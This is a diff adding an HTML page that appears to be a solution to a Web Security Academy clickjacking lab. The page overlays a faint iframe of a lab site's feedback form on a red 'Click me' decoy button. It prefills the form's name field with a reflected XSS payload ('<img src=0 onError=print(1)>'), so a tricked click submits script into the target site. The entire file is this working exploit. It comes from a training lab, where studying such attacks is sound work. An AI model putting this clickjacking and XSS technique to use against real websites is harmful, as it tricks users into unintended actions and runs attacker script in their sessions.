@@ -1,0 +1,40 @@
+<html>
+    <head>
+        <style>
+            #target {
+                position: relative;
+                opacity: 0.4;
+                z-index: 2;
+                width: 500px;
+                height: 900px;
+            }
+
+            #decoy {
+                position: absolute;
+                z-index: 1;
+                width: 240px;
+                height: 120px;
+            }
+
+            button {
+                margin-top: 783px;
+                margin-left: 33px;
+                background-color: red;
+                width: 100px;
+                border-radius: 5px solid black ;
+                font-weight: bold;
+                font-size: 19px;
+                border-radius: 10px;
+            }
+        </style>
+    </head>
+    <body>
+        <div id="decoy">
+            <button >
+                Click me
+            </button>
+        </div>
+        <iframe id="target" src="https://0afd001704b58334805608bf005e006a.web-security-academy.net/feedback?name=<img+src=0+onError=print(1)>&email=a@mail.com&subject=sub&message=mesagge" >
+        </iframe>
+    </body>
+</html>
